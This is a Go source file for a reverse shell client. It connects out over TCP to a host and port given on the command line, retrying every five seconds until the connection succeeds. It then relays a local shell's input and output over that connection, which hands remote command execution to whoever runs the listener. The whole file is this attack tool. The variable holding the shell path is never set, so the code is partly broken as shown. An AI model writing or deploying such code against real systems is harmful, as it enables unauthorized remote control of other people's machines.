package main

import (
	"io"
	"net"
	"os"
	"os/exec"
	"time"
)

var shellPath string

const BUFFERSIZE = 4096

// Forwards data to given channel
func forwardSTD(std io.ReadCloser, channel chan []byte) {
	for {
		data := make([]byte, BUFFERSIZE)
		_, err := std.Read(data)
		if err != nil {
			os.Exit(0)
		}
		channel <- data
	}
}

func startShell(outData chan []byte, inData chan []byte) {

	// base command
	cmd := exec.Command(shellPath)

	// get pipes
	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	// start the shell
	cmd.Start()

	// forward stdout from shell to server
	go forwardSTD(stdout, outData)

	// forward stderr from shell to server
	go forwardSTD(stderr, outData)

	// forward incoming data from server to shell stdin
	for {
		incoming := <-inData
		stdin.Write(incoming)
	}

}

// Reads data from the shell output and sends it to the connection
func sender(conn net.Conn, outData chan []byte) {
	for {
		data := <-outData
		conn.Write(data)
	}
}

// Reads data from the server and sends it to the shell channel (inData)
func recver(conn net.Conn, inData chan []byte) {
	for {
		data := make([]byte, BUFFERSIZE)
		_, err := conn.Read(data)
		if err != nil { // server closed
			os.Exit(0)
		}
		inData <- data
	}
}

// Returns a connection with the server, endless retry with sleep 5 seconds inbetween
func getConnection(endpoint string) net.Conn {
	for {
		conn, err := net.Dial("tcp", endpoint)
		if err != nil {
			// sleep some time
			time.Sleep(5 * time.Second)
		} else {
			conn.Write([]byte("Nice!\n"))
			return conn
		}
	}
}

func main() {

	if len(os.Args) != 3 {
		os.Exit(0)
	}

	ip := os.Args[1]
	port := os.Args[2]
	endpoint := string(ip) + ":" + string(port)

	conn := getConnection(endpoint)

	outData := make(chan []byte) // outgoing stuff
	inData := make(chan []byte)  // incoming stuff

	go startShell(outData, inData)

	go sender(conn, outData)
	go recver(conn, inData)

	for {
		// keep running
	}

}
